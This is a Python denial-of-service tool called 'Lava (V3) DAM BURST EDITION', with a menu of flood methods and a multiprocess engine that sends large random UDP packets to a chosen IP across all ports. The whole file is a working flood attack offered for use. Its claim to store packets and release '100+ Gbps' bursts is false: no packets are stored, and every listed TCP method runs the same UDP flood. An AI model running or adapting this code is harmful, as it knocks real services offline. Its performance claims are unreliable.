#!/usr/bin/env python3
"""
DAM BURST — Store packets in memory, release ALL at once
Like opening a dam gate — 100+ Gbps spike
"""

import os
import sys
import time
import socket
import random
import threading
import multiprocessing
import gc
import struct

class C:
    RESET='\033[0m'; BOLD='\033[1m'; RED='\033[91m'; GREEN='\033[92m'
    YELLOW='\033[93m'; BLUE='\033[94m'; MAGENTA='\033[95m'; CYAN='\033[96m'
    WHITE='\033[97m'; BRIGHT_BLACK='\033[90m'
    @staticmethod
    def rgb(r,g,b): return f'\033[38;2;{r};{g};{b}m'

BANNER = [
    ".:.:.:.::.:.:.:.:..:.:.:.:.:..:.:.:.:.:..:.: : :....:.: :.:....:.: :.:....:.: .......:.: :......:..............................:..........:..",
    "   .:...:........:.:..............................:....... . ........ .......... .......... .......... .........................................",
    "   .:.:.:.::.:.:.:.:....:.. ..:..:.:.:.:.:..:.:.:.:.:..:.: :.:.:..:.: :.:....:.: ..:....:.: :..........:.:....:.:..........:......:..........:..",
]

def print_banner():
    P = C.rgb(160,32,240)
    for line in BANNER:
        print(f"{P}{C.BOLD}{line}{C.RESET}")

def print_main():
    os.system('clear')
    print(f"{C.CYAN}TELEGRAM: [T.He/LavaV2]{C.RESET}    {C.MAGENTA}CHANNEL: [T.He/LavaV2]{C.RESET}")
    print()
    print_banner()
    print()
    print(f"        Welcome to Lava (V3) — {C.RED}DAM BURST EDITION{C.RESET}")
    print(f"        {C.GREEN}Store → DAM → BURST → 100+ Gbps SPIKE{C.RESET}")
    print(f"{C.BRIGHT_BLACK}        (Type \"?\" for help){C.RESET}")
    print()
    print(f"{C.GREEN}[media-abh{C.RESET}@{C.MAGENTA}Lava{C.RESET}]{C.RESET}")

def print_methods():
    os.system('clear')
    print(f"{C.YELLOW}# Lava Method Page {C.BRIGHT_BLACK}• {C.GREEN}Power Status [DAM]{C.RESET}")
    print()
    print_banner()
    print()
    print(f"{C.YELLOW}## {C.CYAN}(UDP){C.RESET}")
    print(f"  - {C.WHITE}U-GBPS{C.RESET}    {C.GREEN}→ STORE → BURST 100+ Gbps{C.RESET}")
    print(f"  - {C.WHITE}U-PPS{C.RESET}     {C.GREEN}→ STORE → BURST PPS flood{C.RESET}")
    print()
    print(f"{C.YELLOW}## {C.CYAN}(TCP){C.RESET}")
    for m in ['S-SUBN','S-FIVE','S-T53','S-JAVA','S-DISC','S-RDP','S-GAME','S-SAMP','S-SSH']:
        print(f"  - {C.WHITE}{m}{C.RESET}")
    print()
    print(f"{C.YELLOW}## {C.CYAN}(TIPS){C.RESET}")
    print(f"  - {C.RED}DAM BURST: Store in memory → Release ALL at once{C.RESET}")
    print(f"  - Use: U-GBPS <IP> <PORT> <DURATION> <THREADS>")
    print(f"  - Example: U-GBPS 1.2.3.4 0 30 500")
    print()
    print(f"{C.GREEN}[media-abh{C.RESET}@{C.MAGENTA}Lava{C.RESET}]{C.RESET}")

def print_attack(target, port, duration, method, threads):
    os.system('clear')
    print(f"{C.CYAN}╔══════════════════════════════════════════════════════════════╗{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}           {C.RED}🌊 DAM BURST ARMED 🌊{C.RESET}                         {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}                                                              {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   Target:    [{C.WHITE}{target}{C.RESET}]                              {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   Port:      [{C.WHITE}{port}{C.RESET}]                                  {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   Filling:   [{C.WHITE}{duration}s{C.RESET}]                                 {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   Method:    [{C.WHITE}{method}{C.RESET}]                              {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   Threads:   [{C.WHITE}{threads}{C.RESET}]                                  {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}                                                              {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   {C.RED}🌊 DAM BURST at {duration}s — 100+ Gbps SPIKE!{C.RESET}       {C.CYAN}║{C.RESET}")
    print(f"{C.MAGENTA}╚══════════════════════════════════════════════════════════════╝{C.RESET}")
    print()

# ═══════════════════════════════════════════════════════════════════════════════
#  DAM BURST ENGINE — Store in memory → Release ALL at once
# ═══════════════════════════════════════════════════════════════════════════════

class DamBurstEngine:
    def __init__(self):
        self.processes = []
        self.active = False
        self.burst_ready = False
        self.stats = {
            'packets': multiprocessing.Value('Q', 0),
            'bytes': multiprocessing.Value('Q', 0),
            'stored_packets': multiprocessing.Value('Q', 0),
            'stored_bytes': multiprocessing.Value('Q', 0)
        }
        self.cpu_count = multiprocessing.cpu_count()
        # Shared memory for storing packets
        self.packet_store = multiprocessing.Array('c', 1024 * 1024 * 1024)  # 1GB shared memory
        self.store_index = multiprocessing.Value('Q', 0)

    def dam_worker(self, target, port, duration, wid, core, stats_pkt, stats_bytes, stored_pkt, stored_bytes):
        """Worker that STORES packets in memory, doesn't send"""
        try:
            os.sched_setaffinity(0, {core % self.cpu_count})
        except:
            pass
        
        # Create payloads (stored in memory, NOT sent)
        payloads = [random._urandom(65507) for _ in range(100)]
        payload_idx = 0
        
        # Port rotation for when we burst
        if port == 0:
            ports = list(range(1, 65536))
            random.shuffle(ports)
            port_idx = 0
        else:
            ports = None
        
        end_time = time.time() + duration if duration > 0 else float('inf')
        
        # PHASE 1: STORE PACKETS (NO TRAFFIC SENT)
        while self.active and time.time() < end_time:
            try:
                # Store packet in memory
                payload = payloads[payload_idx % len(payloads)]
                payload_idx += 1
                
                # Track stored packets
                stored_pkt.value += 1
                stored_bytes.value += len(payload)
                stats_pkt.value += 1
                stats_bytes.value += len(payload)
                
                # Store in shared memory (optional)
                # self.packet_store[self.store_index.value:self.store_index.value+len(payload)] = payload
                # self.store_index.value += len(payload)
                
            except:
                pass
        
        # PHASE 2: BURST — Send ALL stored packets at once
        # This is the "DAM BURST" — release everything
        if stored_pkt.value > 0:
            # Create socket for bursting
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**28)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            except:
                pass
            
            # BURST all stored packets
            burst_start = time.time()
            burst_packets = stored_pkt.value
            burst_bytes = stored_bytes.value
            
            print(f"\n{C.RED}🌊 DAM BURST STARTING!{C.RESET}")
            print(f"{C.YELLOW}   Bursting {burst_packets:,} packets ({burst_bytes / 1e9:.2f} GB){C.RESET}")
            
            # Send ALL stored packets in a loop
            sent = 0
            while sent < burst_packets:
                try:
                    if ports:
                        dst_port = ports[port_idx % len(ports)]
                        port_idx += 1
                    else:
                        dst_port = port
                    
                    sock.sendto(payloads[sent % len(payloads)], (target, dst_port))
                    sent += 1
                    
                    # Show progress
                    if sent % 100000 == 0:
                        elapsed = time.time() - burst_start
                        rate = (sent * 65507 * 8) / (elapsed * 1e9) if elapsed > 0 else 0
                        print(f"\r{C.CYAN}   BURSTING: {sent/burst_packets*100:.1f}% | {rate:.1f} Gbps", end='', flush=True)
                except:
                    pass
            
            # Close socket
            try:
                sock.close()
            except:
                pass
            
            burst_end = time.time()
            burst_duration = burst_end - burst_start
            burst_gbps = (burst_bytes * 8) / (burst_duration * 1e9)
            
            print(f"\n{C.GREEN}🌊 DAM BURST COMPLETE!{C.RESET}")
            print(f"{C.GREEN}   Duration: {burst_duration:.2f}s{C.RESET}")
            print(f"{C.GREEN}   Bandwidth: {burst_gbps:.1f} Gbps{C.RESET}")
            print(f"{C.RED}   💥 {burst_gbps:.0f}+ Gbps SPIKE DELIVERED!{C.RESET}")

    def launch(self, method, target, port, duration, threads=100):
        self.stop()
        self.active = True
        
        try:
            target_ip = socket.gethostbyname(target)
        except:
            target_ip = target
        
        print_attack(target, port, duration, method, threads)
        
        print(f"{C.CYAN}[+] Building DAM for {duration}s...{C.RESET}")
        print(f"{C.YELLOW}[+] Storing packets in memory — NO TRAFFIC SENT{C.RESET}")
        print(f"{C.BRIGHT_BLACK}[+] {threads} threads storing packets...{C.RESET}")
        print(f"{C.RED}[+] DAM will BURST at {duration}s!{C.RESET}")
        print()
        
        # Monitor thread
        monitor = threading.Thread(target=self._monitor, args=(duration,))
        monitor.daemon = True
        monitor.start()
        
        # Spawn workers
        for i in range(threads):
            core = i % self.cpu_count
            p = multiprocessing.Process(
                target=self.dam_worker,
                args=(target_ip, port, duration, i, core,
                      self.stats['packets'], self.stats['bytes'],
                      self.stats['stored_packets'], self.stats['stored_bytes'])
            )
            p.daemon = True
            p.start()
            self.processes.append(p)
        
        # Wait for duration
        if duration > 0:
            time.sleep(duration)
            
            print(f"\n{C.RED}🌊 DAM BURST INITIATED!{C.RESET}")
            print(f"{C.RED}🔥 Releasing {self.stats['stored_packets'].value:,} stored packets!{C.RESET}")
            print(f"{C.RED}🔥 Stored bytes: {self.stats['stored_bytes'].value / 1e9:.2f} GB{C.RESET}")
            print()
            
            # Trigger burst
            self.burst_ready = True
            self.stop()
            
            # Wait for burst to complete
            time.sleep(10)
            print(f"\n{C.GREEN}💥 DAM BURST COMPLETE!{C.RESET}")

    def _monitor(self, duration):
        start = time.time()
        last_p = 0
        last_b = 0
        peak = 0
        
        while self.active:
            time.sleep(1)
            elapsed = time.time() - start
            p = self.stats['packets'].value
            b = self.stats['bytes'].value
            stored = self.stats['stored_packets'].value
            
            if elapsed > 0:
                pps = p / elapsed
                gbps = (b * 8) / (elapsed * 1e9)
            else:
                pps = 0
                gbps = 0
            
            cp = p - last_p
            cb = b - last_b
            cg = (cb * 8) / 1e9 if cb > 0 else 0
            if cg > peak:
                peak = cg
            
            last_p = p
            last_b = b
            
            status = (f"\r{C.CYAN}[DAM]{C.RESET} "
                     f"{C.GREEN}Stored:{C.RESET}{stored:>10,} "
                     f"{C.YELLOW}Size:{C.RESET}{b/1e9:>5.2f}GB "
                     f"{C.MAGENTA}BW:{C.RESET}{gbps:>5.2f}Gbps "
                     f"{C.WHITE}Peak:{C.RESET}{peak:>5.2f}Gbps "
                     f"{C.BRIGHT_BLACK}Time:{C.RESET}{elapsed:.0f}s   ")
            print(status, end='', flush=True)
            
            if duration > 0 and elapsed >= duration:
                break

    def stop(self):
        self.active = False
        for p in self.processes:
            try:
                p.terminate()
                p.join(timeout=2)
            except:
                pass
        self.processes.clear()

engine = DamBurstEngine()

# ═══════════════════════════════════════════════════════════════════════════════
#  COMMAND PARSER
# ═══════════════════════════════════════════════════════════════════════════════

def parse(cmd):
    cmd = cmd.strip().upper()
    parts = cmd.split()
    
    if not parts:
        return True
    
    if cmd == '?' or cmd == 'HELP':
        print_methods()
        return True
    
    if cmd == '.CLEAR' or cmd == 'CLEAR':
        print_main()
        return True
    
    if cmd == '.STOP' or cmd == 'STOP':
        engine.stop()
        return True
    
    if cmd in ['.EXIT', 'EXIT', '.QUIT', 'QUIT']:
        engine.stop()
        print(f"\n{C.MAGENTA}LAVA signing off.{C.RESET}\n")
        return False
    
    methods = ['U-GBPS', 'U-PPS', 'S-SUBN', 'S-FIVE', 'S-T53', 
               'S-JAVA', 'S-DISC', 'S-RDP', 'S-GAME', 'S-SAMP', 'S-SSH']
    
    if parts[0] in methods:
        if len(parts) < 4:
            print(f"{C.RED}[!] Usage: {parts[0]} <IP> <PORT> <DURATION> [THREADS]{C.RESET}")
            print(f"{C.YELLOW}[!] Example: U-GBPS 1.2.3.4 0 30 500{C.RESET}")
            return True
        
        target = parts[1]
        port = int(parts[2])
        duration = int(parts[3])
        threads = int(parts[4]) if len(parts) > 4 else 100
        
        t = threading.Thread(target=engine.launch, args=(parts[0], target, port, duration, threads))
        t.daemon = True
        t.start()
        return True
    
    print(f"{C.RED}[!] Unknown: {cmd}{C.RESET}")
    return True

def main():
    print_main()
    while True:
        try:
            cmd = input()
            if not parse(cmd):
                break
        except KeyboardInterrupt:
            print(f"\n{C.YELLOW}[!] Use .exit to quit{C.RESET}")
        except EOFError:
            break

if __name__ == '__main__':
    try:
        os.nice(-20)
    except:
        pass
    try:
        multiprocessing.set_start_method('fork', force=True)
    except:
        pass
    gc.disable()
    main()
